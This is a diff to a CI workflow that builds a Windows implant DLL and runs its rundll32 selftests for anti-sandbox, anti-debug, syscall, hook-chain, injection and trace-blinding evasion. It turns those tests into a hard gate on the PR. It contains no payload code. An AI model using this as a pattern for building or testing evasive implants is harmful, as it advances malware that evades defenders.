@@ -53,8 +53,11 @@ jobs:
       - name: Build implant DLL (nightly)
         shell: powershell
         run: |
+          # --features selftest: the ~50 nyx_selftest_* rundll32 exports are
+          # #[cfg(feature = "selftest")]; without this flag the DLL CI invokes
+          # below does not contain them and every test reports "missing entry".
           # Full output — never pipe to Select-Object, so compile errors show.
-          cargo +nightly build --release --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-msvc 2>&1
+          cargo +nightly build --release --features selftest --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-msvc 2>&1
           $dll = "crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll"
           if (-not (Test-Path $dll)) { Write-Host "::error::implant DLL build failed"; exit 1 }
           Write-Host "DLL OK: $((Get-Item $dll).Length) bytes"
@@ -67,9 +70,13 @@ jobs:
           Write-Host "CLI + resolver built"
 
       # ---- 2. User-mode selftests on this kernel (build 17763) ----
+      # GATES THE PR. continue-on-error was removed: a selftest that crashes,
+      # times out, or hits the 0xFFFFFFFF/0xFFFFFFFE harness-failure sentinels
+      # now fails the workflow. Passing selftests exit nonzero (bitmask of the
+      # sub-checks that passed, per selftests.rs:1-16); the two 0xFFFFFFFF*
+      # codes are the documented bootstrap-failure sentinels (selftests.rs:5,42).
       - name: Selftest regression (evasion stack)
         shell: powershell
-        continue-on-error: true
         run: |
           # Build 17763 (Windows Server 2019). The implant's anti-sandbox
           # suite (envprobe + antidebug) may flag the host as a VM, so we set
@@ -78,24 +85,43 @@ jobs:
           $env:NYX_SKIP_SANDBOX = "1"
           $dll = "crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll"
           $dllDir = Split-Path $dll
+          # NOTE: nyx_selftest_foliage / nyx_selftest_foliage_apc were removed
+          # (selftests.rs:2473-2474 — Foliage APC chain is dead code). Do not
+          # re-add them here: rundll32 would emit "missing entry" and exit 0,
+          # which the sentinel check below would treat as success.
           $tests = @(
             "nyx_selftest","nyx_selftest_postex","nyx_selftest_evasion",
             "nyx_selftest_syscall_rt","nyx_selftest_blind_nttrace",
-            "nyx_selftest_hookchain","nyx_selftest_foliage_apc",
+            "nyx_selftest_hookchain",
             "nyx_selftest_inject_pool","nyx_selftest_lacuna"
           )
           Write-Host "Test                      Exit   Bits"
           Write-Host "------------------------- ------ ----"
+          $failed = @()
           foreach ($t in $tests) {
             $p = Start-Process rundll32.exe -ArgumentList "$dll,$t" -PassThru -WindowStyle Hidden -WorkingDirectory $dllDir
             $p.WaitForExit(25000) | Out-Null
             if ($p.HasExited) {
-              $bits = if ($p.ExitCode -ge 0) { [Convert]::ToString($p.ExitCode, 2) } else { "0x{0:X}" -f $p.ExitCode }
-              Write-Host ("{0,-25} {1,6} {2}" -f $t, $p.ExitCode, $bits)
+              $code = $p.ExitCode
+              $bits = if ($code -ge 0) { [Convert]::ToString($code, 2) } else { "0x{0:X}" -f $code }
+              Write-Host ("{0,-25} {1,6} {2}" -f $t, $code, $bits)
+              # 0xFFFFFFFF = harness bootstrap fail, 0xFFFFFFFE = RT bootstrap
+              # fail (selftests.rs:5,42). Any other value (incl. 0) is a real
+              # bitmask the test produced and therefore "ran". A TIMEOUT is
+              # the only non-bootstrap run failure we treat as hard-fail here.
+              if ($code -eq -1 -or $code -eq 0xFFFFFFFE -or $code -eq -2) {
+                $failed += "{0}=0x{1:X8} (bootstrap sentinel)" -f $t, $code
+              }
             } else {
               $p.Kill(); Write-Host ("{0,-25} TIMEOUT" -f $t)
+              $failed += "$t=TIMEOUT"
             }
           }
+          if ($failed.Count -gt 0) {
+            Write-Host "::error::selftest failures:`n  - " + ($failed -join "`n  - ")
+            exit 1
+          }
+          Write-Host "::notice::all $($tests.Count) selftests ran without bootstrap-sentinel or timeout failures"
 
       # ---- 3. Live PDB offset resolution (ground-truth verification) ----
       - name: "Live PDB offset resolution (host's own kernel, build 17763)"
